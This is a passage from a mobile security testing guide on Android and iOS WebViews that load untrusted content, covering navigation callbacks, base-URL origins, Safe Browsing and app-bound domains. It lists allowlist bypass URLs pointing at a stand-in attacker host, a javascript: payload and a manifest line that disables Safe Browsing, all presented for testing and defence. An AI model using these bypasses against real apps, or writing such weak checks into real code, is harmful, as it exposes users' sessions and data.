---
title: "WebViews Loading Untrusted Content (MASWE-0035)"
date: 2026-11-09 21:06:00 +0000
subcategory: platform
summary: "Testing Android and iOS WebViews for unrestricted navigation, attacker-controlled URLs, weak allowlists, disabled Safe Browsing and UIWebView."
refs: [MASWE-0035, MASVS-PLATFORM-2, MASVS-CODE-4, CWE-79, CWE-601, CWE-829]
tags: [android, ios, masvs-platform, webview, url-validation, safe-browsing]
---

This note is part of our [MASVS-PLATFORM guide](/mobile/masvs-platform-platform-interaction-guide/) and covers OWASP [MASWE-0035](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0035/): WebViews that render content the app does not control. A WebView is not a browser tab. It runs inside your app, under your app's name, often with session cookies, an injected native bridge and local file access, and with no address bar the user can check. So whatever a WebView loads gets privileges a page opened in Chrome or Safari never would. If an attacker can choose that page, through a deep link, an intent extra, a push payload, a server-supplied URL or a link that slips past a weak allowlist, they run their own JavaScript with those privileges. Below you will find how each platform decides what a WebView may load (Android `WebViewClient` and its two `shouldOverrideUrlLoading` overloads, `loadUrl` and `loadDataWithBaseURL`, Safe Browsing; iOS `WKNavigationDelegate`, app-bound domains, the end of `UIWebView`, and the browser-based alternatives), the allowlist mistakes we find most often, the five OWASP tests with their demos, our dynamic procedure for driving every load input with an attacker URL, secure patterns, and how to rate what you find.

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: URL loading, navigation control and Safe Browsing (MASTG-KNOW-0018)](#android-url-loading-navigation-control-and-safe-browsing-mastg-know-0018)
  - [iOS: Navigation control and content trust in WKWebView (MASTG-KNOW-0076)](#ios-navigation-control-and-content-trust-in-wkwebview-mastg-know-0076)
- [Tests](#tests)
  - [Before you start: map the WebViews and their inputs](#before-you-start-map-the-webviews-and-their-inputs)
  - [MASTG-TEST-0398: References to WebViewClient URL Loading Handlers (Android)](#mastg-test-0398-references-to-webviewclient-url-loading-handlers-android)
  - [MASTG-TEST-0399: SafeBrowsing Disabled (Android)](#mastg-test-0399-safebrowsing-disabled-android)
  - [MASTG-TEST-0400: Runtime Use of WebViewClient URL Loading Handlers (Android)](#mastg-test-0400-runtime-use-of-webviewclient-url-loading-handlers-android)
  - [MASTG-TEST-0331: Use of Deprecated WebView APIs (iOS)](#mastg-test-0331-use-of-deprecated-webview-apis-ios)
  - [MASTG-TEST-0332: Attacker-Controlled URI in WebViews (iOS)](#mastg-test-0332-attacker-controlled-uri-in-webviews-ios)
  - [GT-0035-1: Driving every WebView load input with an attacker URL (Android and iOS)](#gt-0035-1-driving-every-webview-load-input-with-an-attacker-url-android-and-ios)
- [Best practices](#best-practices)
  - [MASTG-BEST-0032: Migrate from UIWebView to WKWebView](#mastg-best-0032-migrate-from-uiwebview-to-wkwebview)
  - [MASTG-BEST-0034: Validate WebView Input](#mastg-best-0034-validate-webview-input)
  - [Secure patterns for Android and iOS (Guler Tech)](#secure-patterns-for-android-and-ios-guler-tech)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0035 applies when a WebView loads URLs, HTML or JavaScript from a source the developer does not control, or lets content navigate to arbitrary sites. The OWASP requirement is *"The app only allows trusted content in WebViews."* It maps to MASVS-PLATFORM-2 ("The app uses WebViews securely") and MASVS-CODE-4 ("The app validates and sanitizes all untrusted inputs"), and to three CWEs: [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (cross-site scripting), [CWE-601](https://cwe.mitre.org/data/definitions/601.html) (open redirect) and [CWE-829](https://cwe.mitre.org/data/definitions/829.html) (inclusion of functionality from an untrusted control sphere). Android's risk catalogue files the same problems as *cross-app scripting* and *unsafe URI loading*. The weakness is tagged for profiles L1, L2 and EUDIW, so every app is expected to meet it.

OWASP's threat is MAS-THREAT-0035, *"Attackers can execute malicious web content inside the app's WebView"*, and it names two ways in:

- **MAS-ATTACK-0047**: delivering crafted deep links or intents from a malicious app or web page. The attacker is either an ordinary app on the device with no special permissions, which sends an intent to an exported activity, or a web page, email or message with a link the user taps. Either way the attacker picks the URL the WebView opens.
- **MAS-ATTACK-0051**: injecting malicious JavaScript into WebView content, through a machine-in-the-middle on insecure connections or a compromised website. Here the WebView loads the right URL, but the content is not what the developer expected: a hijacked CDN script, an ad network creative, user-generated content on an allowed domain, or a page reached through an open redirect.

The reason this is a separate weakness, and not "just XSS", is the privilege gap. In a browser, an attacker's page is isolated from your origin and from the device. In a WebView it may sit next to everything below, and the related notes cover each part. This note does not repeat them:

| Once attacker content runs in the WebView, it can… | Where we cover it |
|---|---|
| Call native code through `addJavascriptInterface`, `addWebMessageListener` or `WKScriptMessageHandler` | [MASWE-0033: native bridges](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/) |
| Read local files or content providers through `file://` / `content://` and the file-access settings | [MASWE-0034: local resources](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) (also the general WebView configuration reference) |
| Be injected in transit because the WebView allows cleartext or mixed content | [MASWE-0026: cleartext traffic](/mobile/maswe-0026-cleartext-network-traffic/) |
| Be injected in transit because certificate errors are ignored (`onReceivedSslError` → `proceed()`) | [MASWE-0027: certificate validation](/mobile/maswe-0027-insecure-certificate-validation/) |
| Arrive through a deep link the app does not validate | [MASWE-0029: deep links](/mobile/maswe-0029-insecure-deep-links/) (the usual entry point) and [MASWE-0032: intents](/mobile/maswe-0032-insecure-intents/) |

This note covers what sits in the middle: **which URLs and HTML the WebView agrees to render, and who gets to choose them.**

OWASP links five tests to MASWE-0035 and files all of them here: iOS MASTG-TEST-0331 and 0332, and Android MASTG-TEST-0398, 0399 and 0400. The Android tests live in OWASP's MASVS-CODE folder (because URL validation is input validation), but their `maswe` field points here. OWASP's reference case is Oversecured's write-up of a universal XSS in a popular note-taking app for Android that allowed theft of cookies for all sites; the same pattern recurs in many apps.

## Modes of Introduction

**Setting a WebViewClient and not restricting it.** On Android, a WebView with no `WebViewClient` hands link navigations to the browser. The moment the app calls `setWebViewClient(...)`, often only to show a progress bar or handle errors, every navigation stays inside the WebView, and unless `shouldOverrideUrlLoading` blocks it, the user (or a script) can go anywhere with the app's cookies and bridges in place.

**Allowlists that check the string, not the URL.** `url.contains("example.com")`, `url.startsWith("https://example.com")`, `host.endsWith("example.com")`, regexes without anchors, case-sensitive denylists. Each one has a well-known bypass, listed under the Android knowledge section below.

**Loading URLs from external input.** An exported activity that does `webView.loadUrl(intent.getStringExtra("url"))`; a deep-link handler that forwards `?url=`; a push notification whose payload carries the page to open; a remote-config value or API response field holding a "help" or "promo" URL, all with no check on scheme and host. On Android, `shouldOverrideUrlLoading` is *not* called for the app's own `loadUrl()`, so an allowlist implemented only there does not cover this path at all.

**Allowed domains that are not really trusted.** The allowlist is correct, but one allowed domain has an open redirect, hosts user-generated content, embeds third-party ads, or loads scripts from a CDN without Subresource Integrity. The attacker never has to leave the allowlist.

**Handing dangerous schemes to the platform.** Code in `shouldOverrideUrlLoading` that turns any `intent:` URL into an `Intent` and starts it, letting a web page launch the app's own non-exported activities. Code that passes `javascript:` or `file:` URLs from external input straight to `loadUrl`.

**Giving untrusted HTML a trusted origin.** `loadDataWithBaseURL("https://app.example.com/", untrustedHtml, ...)` or iOS `loadHTMLString(_:baseURL:)` with the app's real origin: the HTML now runs as that origin, with its cookies, storage and any origin-scoped bridge.

**Untrusted script inclusion.** JavaScript fetched at runtime and injected with `evaluateJavascript` / `evaluateJavaScript(_:)` or as a `WKUserScript`; string-built JavaScript that concatenates attacker data; HTML templates that insert query parameters with `innerHTML` (the iOS demo below).

**Platform protections turned off.** Safe Browsing disabled in the manifest or in code, or neutralised with an `onSafeBrowsingHit` handler that always proceeds.

**Deprecated components.** `UIWebView` on iOS (no way to disable JavaScript, permissive file access, no out-of-process rendering), kept alive by an old SDK.

## Impact

- **Compromise of sensitive data.** Attacker script running in an authenticated WebView reads what the page shows, the cookies it can see, tokens in `localStorage`, URLs and referrers. With a universal XSS (attacker content running in *other* origins' contexts) it can read cookies for every site the WebView has a session with.
- **Account takeover.** Stolen session cookies or tokens are replayed against the real backend. Apps that pass an `Authorization` header in `loadUrl(url, headers)` or append a token to the URL hand it straight to the attacker's server.
- **Native functionality abuse.** Any bridge the WebView exposes (see [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/)) becomes callable by the attacker: reading contacts, sending messages, starting payments, reading files.
- **Phishing under the app's identity.** A login form rendered inside the banking app's own screen, with no address bar, is very convincing. Drive-by downloads and malicious redirects are the same problem.
- **Loss of user trust and regulatory exposure.** Users blame the app, and an account takeover with personal data involved is a reportable breach under UK GDPR.

## Mitigations

- **Do not use a WebView for content you do not own.** Open third-party and arbitrary pages in the browser, Custom Tabs or `SFSafariViewController`; use `ASWebAuthenticationSession` or Custom Tabs for sign-in.
- **Allowlist navigation by parsed scheme and exact host.** Require `https`, compare the host for equality against a short set (or a correct `"." + domain` suffix check), reject user-info and unexpected ports, and send everything else to the browser or block it. Do it in `shouldOverrideUrlLoading` on Android and `webView(_:decidePolicyFor:decisionHandler:)` on iOS, and use `limitsNavigationsToAppBoundDomains` where it fits.
- **Validate before you load, too.** Every `loadUrl` / `load(_:)` call fed from a deep link, intent, push payload or server value needs the same check, because on Android the navigation callback does not see the app's own loads. Better still, map external input to fixed destinations ("open help article 42") instead of accepting URLs.
- **Never give untrusted HTML a trusted origin.** Use a `null` / `nil` base URL or a dedicated origin that holds nothing, and keep JavaScript off unless needed.
- **Load scripts only from trusted, integrity-checked sources.** No runtime-fetched JavaScript; use Subresource Integrity for third-party scripts; escape data with `textContent`, not `innerHTML`.
- **Keep Safe Browsing on** and do not override its interstitial.
- **Use current components.** `WKWebView` only on iOS; keep the Android System WebView updatable and do not bundle old engines.

## Knowledge

OWASP links one Knowledge page per platform: [MASTG-KNOW-0018](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/) (Android WebViews) and [MASTG-KNOW-0076](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/) (iOS WebViews). Both are long and cover every WebView topic. The general configuration (JavaScript, file and content access, storage, network security of WebViews) is explained in our [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/), and the bridges in [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/). Here we cover the navigation and content-trust parts in depth and give a short summary of the rest.

### Android: URL loading, navigation control and Safe Browsing (MASTG-KNOW-0018)

Source: [MASTG-KNOW-0018](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), extended with the Android reference documentation for [`WebViewClient`](https://developer.android.com/reference/android/webkit/WebViewClient), [`WebView`](https://developer.android.com/reference/android/webkit/WebView), [`WebSettings`](https://developer.android.com/reference/android/webkit/WebSettings) and the Android risk pages on [unsafe URI loading](https://developer.android.com/privacy-and-security/risks/unsafe-uri-loading).

#### The configuration in one paragraph

Since Android 4.4 the WebView is Chromium-based, and since Android 5 it is updated through the Play Store as the *Android System WebView* package (on Android 7 to 9, Chrome itself can be the provider). JavaScript is off by default (`setJavaScriptEnabled(false)`); `file://` access is off by default for apps targeting Android 11 (API 30) or higher; `content://` access is on by default; `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` are off and deprecated. All of that, with its abuse cases, is in the [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/). What matters here is that these settings decide *how bad* untrusted content is; navigation control decides *whether* it gets in. You can check which WebView implementation and version a test device uses with:

```bash
adb shell dumpsys webviewupdate | grep -E 'Current WebView package|packageName|versionName'
```

#### Who handles a navigation: with and without a WebViewClient

Android's documentation for `shouldOverrideUrlLoading` states the rule: *if a `WebViewClient` is not provided, WebView asks the Activity Manager to choose the proper handler for the URL*. In practice the app's own `loadUrl()` renders inside the WebView, but when the user taps a link or the page sets `window.location`, the system opens the URL in the default browser, where it gets no access to the app's cookies or bridges. That default is safe, and it is what OWASP calls "the default and safest behaviour".

As soon as a `WebViewClient` is set, the WebView handles navigations itself. Whatever `shouldOverrideUrlLoading` returns decides the outcome:

| Situation | Result for a link or script navigation |
|---|---|
| No `WebViewClient` | Handed to the Activity Manager (browser or another app) |
| `WebViewClient` set, `shouldOverrideUrlLoading` not overridden | Loaded **in the WebView** (the base method returns `false`) |
| Override returns `false` | Loaded in the WebView |
| Override returns `true` | Cancelled; the app may do something else (open the browser, start an intent, show an error) |

This is why MASTG-TEST-0398 flags a bare `setWebViewClient(new WebViewClient())`: it is the most common way apps open themselves up to arbitrary navigation without meaning to. It is also why "the app sets a WebViewClient" is not a finding by itself: what matters is the decision logic.

#### shouldOverrideUrlLoading: both overloads

There are two overloads, and apps often implement only one:

| Overload | API level | Notes |
|---|---|---|
| `shouldOverrideUrlLoading(WebView view, String url)` | 1, deprecated in 24 | Receives the URL string only. On API 24+ the default implementation of the new overload calls this one, so an app that only overrides the old one still gets called on new devices. |
| `shouldOverrideUrlLoading(WebView view, WebResourceRequest request)` | 24 | Receives `getUrl()` (a `Uri`), `isForMainFrame()`, `isRedirect()`, `hasGesture()`, `getMethod()` and `getRequestHeaders()`. |

Things the documentation states and testers need to keep in mind:

- **It is not called for navigations the app starts with `loadUrl()`.** Android says so explicitly. It *is* called for navigations started by the page (JavaScript), by the user (link taps) and by HTTP redirects, including a redirect of the app's own `loadUrl()`. So an allowlist that lives only in `shouldOverrideUrlLoading` protects against links and redirects, never against `loadUrl(intent.getStringExtra("url"))`.
- **It is not called for POST requests.** A form with `method="post"` that targets an attacker host navigates there without the callback ever running. Neither is it called for sub-resources (`<script src>`, `<img>`, XHR/fetch); those go through `shouldInterceptRequest`.
- **It may be called for subframes and for non-HTTP(S) schemes.** `isForMainFrame()` tells you which. Code that ignores the frame either blocks legitimate iframes or, more often, applies the check only to the main frame and lets any iframe navigate anywhere.
- **Return `false` to continue; do not call `view.loadUrl(url)` and return `true`.** The documented anti-pattern is not only wasteful: a `loadUrl` from inside the callback is an app-initiated load that does not come back through `shouldOverrideUrlLoading`, so if the code rewrites or "fixes up" the URL before calling it, the rewritten URL is never checked.
- **Check the requested URL, not the current one.** `view.getUrl()` is the page you are leaving. Code that validates `view.getUrl()` approves the navigation as long as the *current* page was trusted.
- **Both overloads must agree.** If `minSdkVersion` is below 24 and the two overloads contain different logic (or only the new one has the allowlist), devices on Android 6 and older get the weaker path.

#### shouldInterceptRequest

`shouldInterceptRequest(WebView, WebResourceRequest)` (API 21; the `String` overload from API 11 is deprecated) is called for every resource request, main-frame documents included, and lets the app return its own `WebResourceResponse` or `null` to load normally. It runs on a background thread. The documentation lists the gaps: it is not called for `javascript:` or `blob:` URLs, nor for `file:///android_asset/` and `file:///android_res/`, and for redirects it is called only for the initial URL, not for the redirect targets. So it can block third-party sub-resources and is the right hook for serving local content (`WebViewAssetLoader`), but it is not a navigation allowlist on its own, because a redirect from an allowed URL to an attacker URL is never shown to it.

#### Allowlist pitfalls

Every one of these is something we regularly find. Use them as test payloads (GT-0035-1 lists them ready to copy).

| Check in the app | Bypass URL | Why it passes |
|---|---|---|
| `url.contains("example.com")` | `https://attacker.example.net/?example.com` or `https://example.com.attacker.example.net/` | The string appears somewhere |
| `url.startsWith("https://example.com")` | `https://example.com.attacker.example.net/` or `https://example.com@attacker.example.net/` | The prefix matches; in the second case `example.com` is the *user-info*, the host is `attacker.example.net` |
| `host.endsWith("example.com")` | `https://attackerexample.com/` | No dot before the domain; Android's own guidance calls this out |
| `host == "example.com"` but scheme not checked | `http://example.com/` (cleartext, injectable on the network), `javascript://example.com/%0aalert(1)` | Host is right, scheme is not |
| Denylist `!host.equals("attacker.com")` | `https://ATTACKER.com/`, `https://attacker.com./` | `android.net.Uri.getHost()` does not lower-case or strip the trailing dot |
| `if (host != null && !allowed(host)) return true` | `javascript:…`, `intent:…`, `data:text/html,…` | Opaque URIs have no host; `getHost()` returns `null` and the check is skipped |
| Regex `https://.*\.example\.com.*` | `https://attacker.example.net/?.example.com` | Unanchored; Android also advises against regexes for hosts |
| `Uri.parse(input).getHost()` on a raw string *before* `loadUrl` | `https://attacker.example.net\@example.com/` | Parser differential: Chromium treats `\` as `/` in `http(s)` URLs and loads `attacker.example.net`; a parser that treats `\` as an ordinary character sees user-info `attacker.example.net\` and host `example.com`. Older `android.net.Uri` builds behaved like this; test it on the target's minimum OS and with whatever parser the app uses (`java.net.URI`, `HttpUrl`, a regex) |
| Correct host check on an allowed domain with an open redirect | `https://example.com/out?to=https://attacker.example.net/` | The first navigation is allowed; the redirect target only reaches `shouldOverrideUrlLoading` if the app checks redirects, and never reaches `shouldInterceptRequest` |

The point of the last two rows: validate the URL **the WebView is actually going to load**, using the URL object the WebView gives you (`request.getUrl()` in the callback, already canonicalised by Chromium), and validate it again at every navigation, including redirects. Validating a raw string from an intent with a different parser is where differentials bite.

#### Dangerous schemes

- **`javascript:`** passed to `loadUrl()` runs in the context of **the page currently loaded** in that WebView. If the attacker can supply the string while a trusted, authenticated page is loaded, they get script execution in your origin, with its cookies and bridges. This is the classic way an "open any URL" intent turns into cross-app scripting.
- **`intent:`** URLs are not handled by the WebView. Apps that support them call `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)` in `shouldOverrideUrlLoading` and start the result. Because the app starts it, the intent can target the app's own **non-exported** components with attacker-chosen extras (intent redirection, see [MASWE-0032](/mobile/maswe-0032-insecure-intents/)). If the app must support them, it has to add `CATEGORY_BROWSABLE`, clear the component and the selector (`setComponent(null)`, `setSelector(null)`), and ideally only allow `market:` or specific packages.
- **`file:`** and **`content:`** give access to local data, subject to the settings explained in [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/). A WebView that loads attacker-chosen `file://` URLs with JavaScript on is one of the most damaging variants of this weakness.
- **`data:`** and **`blob:`** create documents with opaque origins; they are not dangerous by themselves but are a way to run attacker HTML when the app thinks it only allows "safe" schemes.

#### loadUrl with attacker-controlled input

The sinks to look for, all on `WebView`:

| Method | Concern |
|---|---|
| `loadUrl(String)` | The URL comes from an intent extra, `intent.getData()`, a deep-link query parameter, a push payload or a server value |
| `loadUrl(String, Map<String, String> additionalHttpHeaders)` | The same, plus the app adds headers such as `Authorization` or an API key. Those are sent to whatever host the URL names: an attacker URL receives the token |
| `postUrl(String, byte[])` | POST navigation; `shouldOverrideUrlLoading` never sees POSTs |
| `loadData(...)` / `loadDataWithBaseURL(...)` | The HTML comes from outside |
| `evaluateJavascript(String, ...)` / `loadUrl("javascript:" + …)` | The script is built by string concatenation with outside data |

The entry points are covered in other notes: deep links in [MASWE-0029](/mobile/maswe-0029-insecure-deep-links/), intents and exported components in [MASWE-0032](/mobile/maswe-0032-insecure-intents/) and [MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/). What this note adds is the rule that the sink must validate regardless of where the value came from, because server values and push payloads are attacker-controlled the moment a backend, a marketing console or a network path is compromised.

#### loadDataWithBaseURL and the origin you give the content

Android's documentation is precise about what the base URL does. *The base URL is used both to resolve relative URLs and when applying JavaScript's same origin policy.* The choices:

| `baseUrl` | Origin of the loaded HTML | Consequence |
|---|---|---|
| `null` | `about:blank`; `window.origin` is `"null"` | Opaque origin: no access to your site's cookies or storage. Android warns that a `null` origin must not be trusted by the app either (for example in web-message handlers), because any page can create a `null`-origin frame |
| `https://app.example.com/` | `https://app.example.com` | The HTML runs **as your site**: same cookies (subject to their flags), same `localStorage`, same origin rules for `addWebMessageListener`. Untrusted HTML here is XSS in your origin |
| `file:///android_asset/` or another non-web scheme | `file:` | The documentation notes that content can access local files (via `file:` URLs) only if the base URL scheme is not `http`, `https`, `ftp`, `ftps`, `about` or `javascript`. Combined with file-access settings this is local file disclosure ([MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/)) |
| `data:` | Same as `loadData()` | Opaque origin |

`loadData()` itself always uses a `data:` URL and an opaque origin. For app-bundled content, prefer AndroidX `WebViewAssetLoader`, which serves assets under `https://appassets.androidplatform.net/` so they never need a `file:` origin.

#### New windows

With `WebSettings.setSupportMultipleWindows(true)` and a `WebChromeClient.onCreateWindow(...)` implementation, `window.open()` and `target="_blank"` create a **new** WebView. That WebView has whatever client the app gives it, frequently none or a plain `WebViewClient()`, so a page that is blocked from navigating the main WebView simply opens a new window. Review `onCreateWindow` together with `shouldOverrideUrlLoading`.

#### Safe Browsing

WebView checks URLs against [Google Safe Browsing](https://developers.google.com/safe-browsing/) and shows an interstitial for known phishing, malware, unwanted-software and billing-fraud pages. The history matters when you read old code:

- **Android 8.0 (API 26)** added the per-WebView switch [`WebSettings.setSafeBrowsingEnabled(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setSafeBrowsingEnabled%28boolean%29) and the manifest meta-data `android.webkit.WebView.EnableSafeBrowsing`. Safe Browsing was opt-in at first and has been on by default since WebView 66 (2018); Android's documentation now states *"Safe Browsing is enabled by default for devices which support it."*
- **Android 8.1 (API 27)** added the response API: `WebViewClient.onSafeBrowsingHit(view, request, threatType, SafeBrowsingResponse)` with `backToSafety(report)`, `proceed(report)` and `showInterstitial(allowReporting)`; `WebView.setSafeBrowsingWhitelist(List<String>, ValueCallback)` (AndroidX: `WebViewCompat.setSafeBrowsingAllowlist`) to exempt hosts; and `WebView.startSafeBrowsing(...)`. The threat constants are `SAFE_BROWSING_THREAT_MALWARE`, `_PHISHING`, `_UNWANTED_SOFTWARE`, `_UNKNOWN` and, from API 29, `_BILLING`.
- `startSafeBrowsing` is deprecated in recent API levels: from WebView 122 initialisation is automatic.

To opt every WebView out, an app adds:

```xml
<application>
    <meta-data android:name="android.webkit.WebView.EnableSafeBrowsing"
               android:value="false" />
</application>
```

The `WebSettings` documentation says *"The manifest tag has a lower precedence than this API"*, so `setSafeBrowsingEnabled(false)` disables it for that WebView even if the manifest says `true`, and `setSafeBrowsingEnabled(true)` re-enables it for that WebView even under a manifest opt-out. There are three more ways to neuter it that a manifest check misses: an `onSafeBrowsingHit` that calls `callback.proceed(false)` unconditionally (the user never sees a warning), an allowlist with broad entries (the allowlist matches subdomains for a bare `HOSTNAME` rule), and the AndroidX `WebSettingsCompat.setSafeBrowsingEnabled(settings, false)`.

Safe Browsing relies on Google Play services, so on devices and emulator images without them it is not active, whatever the app says. It also only knows about *reported* bad sites: it does nothing against a fresh attacker domain or against XSS on a trusted one. Treat it as defence in depth, not as a navigation control. KNOW-0018 also mentions the SafetyNet Safe Browsing client and the VirusTotal API for checking URLs from app code; they are optional extras and do not affect the tests.

#### Alternatives to a WebView

For content the app does not own, [Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs/overview/) open the page in the user's browser with its address bar, Safe Browsing, password manager and separate cookie jar, and the app cannot inject script or read the page. [Trusted Web Activities](https://developer.android.com/develop/ui/views/layout/webapps/trusted-web-activities) do the same full-screen for the app's own verified site. For sign-in, Custom Tabs with an AppAuth-style flow is the standard.

### iOS: Navigation control and content trust in WKWebView (MASTG-KNOW-0076)

Source: [MASTG-KNOW-0076](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/), extended with Apple's documentation for [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview), [`WKNavigationDelegate`](https://developer.apple.com/documentation/webkit/wknavigationdelegate) and the WebKit blog post on [App-Bound Domains](https://webkit.org/blog/10882/app-bound-domains/).

#### The WebView types, and the end of UIWebView

| Component | Since | Use | What the app controls |
|---|---|---|---|
| `WKWebView` (WebKit) | iOS 8 | Embedding content the app owns | Everything: navigation delegate, JavaScript (`WKWebpagePreferences.allowsContentJavaScript`, iOS 14; the older `WKPreferences.javaScriptEnabled` is deprecated), bridges, cookies. Rendering and networking run in separate WebContent and Networking processes |
| `SFSafariViewController` (SafariServices) | iOS 9 | Showing third-party pages | Almost nothing: no script injection, no access to the page, a read-only address bar, Safari's Safe Browsing ("Fraudulent Website Warning") and content blockers |
| `ASWebAuthenticationSession` (AuthenticationServices) | iOS 12 | OAuth / OIDC sign-in | Only the start URL and the callback |
| `UIWebView` (UIKit) | iOS 2, deprecated iOS 12 | Nothing; must not be used | Cannot disable JavaScript; `file:` content has universal access; in-process rendering |

`UIWebView` is no longer an option for App Store apps: Apple announced in December 2019 that *"The App Store will no longer accept new apps using UIWebView as of April 2020 and app updates using UIWebView as of December 2020"*, and App Store Connect rejects such binaries with ITMS-90809 ("Deprecated API Usage"). Any reference counts, including one inside a third-party framework the app never calls. You will still meet it in enterprise and ad-hoc builds, very old apps that have not been updated, and SDK binaries in intermediate builds, and that is where MASTG-TEST-0331 earns its place.

Note that KNOW-0076 says `SFSafariViewController` shares cookies and website data with Safari. That was true up to iOS 10; since iOS 11 each app's `SFSafariViewController` has its own data store, separate from Safari. `ASWebAuthenticationSession`, in contrast, shares Safari's cookies by default (that is how single sign-on works), unless the app sets `prefersEphemeralWebBrowserSession = true` (iOS 13).

#### Loading APIs and the origin they create

| API (Swift / Objective-C selector) | What it loads | Origin |
|---|---|---|
| `load(_:)` / `loadRequest:` | A `URLRequest`, remote or local | The URL's origin |
| `loadHTMLString(_:baseURL:)` / `loadHTMLString:baseURL:` | An HTML string | `baseURL`; with `nil`, an opaque `null` origin |
| `load(_:mimeType:characterEncodingName:baseURL:)` / `loadData:MIMEType:characterEncodingName:baseURL:` | Raw data | `baseURL`, as above |
| `loadFileURL(_:allowingReadAccessTo:)` / `loadFileURL:allowingReadAccessToURL:` | A local file | `file:`; readable scope set by the second argument |
| `loadFileRequest(_:allowingReadAccessTo:)` (iOS 15) | A local file as a `URLRequest` | Same |
| `loadSimulatedRequest(_:response:responseData:)` and `loadSimulatedRequest(_:responseHTMLString:)` (iOS 15) | App-supplied bytes presented as the response to a URL | The request URL's origin, without any network fetch |

The origin rules are the iOS twin of `loadDataWithBaseURL`: HTML passed with `baseURL` set to `https://app.example.com` runs as that origin, with its cookies in the WebView's data store and any origin-gated logic in your message handlers. `loadSimulatedRequest` deserves a second look in code review because it lets the app attach *any* URL, and therefore any origin, to bytes it built itself. The `allowingReadAccessTo` scope and the undocumented `allowFileAccessFromFileURLs` / `allowUniversalAccessFromFileURLs` preferences are covered in [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/).

`WKWebView` networking goes through the same stack as `URLSession`, so App Transport Security applies, with the WebView-specific relaxation `NSAllowsArbitraryLoadsInWebContent`. Mixed active content is blocked by WebKit regardless. Both topics are in the [cleartext traffic note](/mobile/maswe-0026-cleartext-network-traffic/).

#### WKNavigationDelegate: deciding what may load

The navigation decision is `webView(_:decidePolicyFor:decisionHandler:)` on [`WKNavigationDelegate`](https://developer.apple.com/documentation/webkit/wknavigationdelegate) (Objective-C `webView:decidePolicyForNavigationAction:decisionHandler:`), or the iOS 13 variant that also passes `WKWebpagePreferences` (`webView:decidePolicyForNavigationAction:preferences:decisionHandler:`). The delegate must call the handler exactly once with `.allow`, `.cancel` or, since iOS 14.5, `.download`. Differences from Android that change how you test:

- **It is called for app-initiated loads as well.** `load(_:)` produces a navigation action (type `.other`) that goes through the delegate, so a correct delegate also covers URLs the app loads from deep links. Android's callback does not.
- **It is called for every frame.** `navigationAction.targetFrame?.isMainFrame` tells you whether the main frame or an iframe is navigating; `targetFrame == nil` means the page asked for a new window. `sourceFrame` is where the request came from.
- **`navigationType`** distinguishes `.linkActivated`, `.formSubmitted`, `.formResubmitted`, `.backForward`, `.reload` and `.other` (scripts, redirects, app loads). Delegates that only check `.linkActivated` let script navigations and redirects through.
- **Redirects**: in our testing, server redirects of a main-frame navigation are presented to the delegate as a new navigation action for the redirect target, so redirect chains are visible to it (unlike Android's `shouldInterceptRequest`). Confirm it on the target with the hook in GT-0035-1 rather than assuming it.
- The response-side callback `webView(_:decidePolicyFor:decisionHandler:)` taking a `WKNavigationResponse` sees the response headers and MIME type; it is useful to block unexpected downloads, not as a URL allowlist.

The usual mistakes mirror Android: `url.absoluteString.contains("example.com")`, `hasPrefix("https://example.com")`, `host.hasSuffix("example.com")`, a missing scheme check, `.allow` as the fallback at the bottom of the function, and allowlists written only for `.linkActivated`. One iOS-specific trap: since iOS 17 (when linked against the iOS 17 SDK), `URL(string:)` parses according to RFC 3986 and percent-encodes invalid characters instead of returning `nil`, so validation code that relied on `URL(string:)` failing for odd input now receives a URL. The robust approach is to make the decision on `navigationAction.request.url`, the URL WebKit itself parsed and is about to load, using `URLComponents` for scheme and host.

New windows go through `WKUIDelegate.webView(_:createWebViewWith:for:windowFeatures:)`. If the app does not implement it, `target="_blank"` links do nothing. A common workaround is to call `webView.load(navigationAction.request)` in the navigation delegate when `targetFrame == nil`. That is fine, because the new load passes through the delegate again, as long as the delegate actually validates.

#### App-bound domains (iOS 14+)

App-bound domains are Apple's declarative navigation allowlist. The app lists up to **10** domains in Info.plist:

```xml
<key>WKAppBoundDomains</key>
<array>
    <string>example.com</string>
    <string>help.example.com</string>
</array>
```

Two things follow, and they are easy to confuse:

1. **Adding the key restricts the powerful APIs.** With `WKAppBoundDomains` present, WebKit denies JavaScript injection (`evaluateJavaScript`, user scripts), custom style sheets, cookie manipulation through `WKHTTPCookieStore`, and `window.webkit.messageHandlers` in WebViews that are not limited to app-bound domains. Local files, `data:` URLs and HTML strings count as app-bound.
2. **`WKWebViewConfiguration.limitsNavigationsToAppBoundDomains = true`** gets those APIs back for a given WebView, in exchange for a hard rule: that WebView can only navigate its **top-level frame** to app-bound domains; any other navigation fails with an app-bound domain error. Third-party iframes still load.

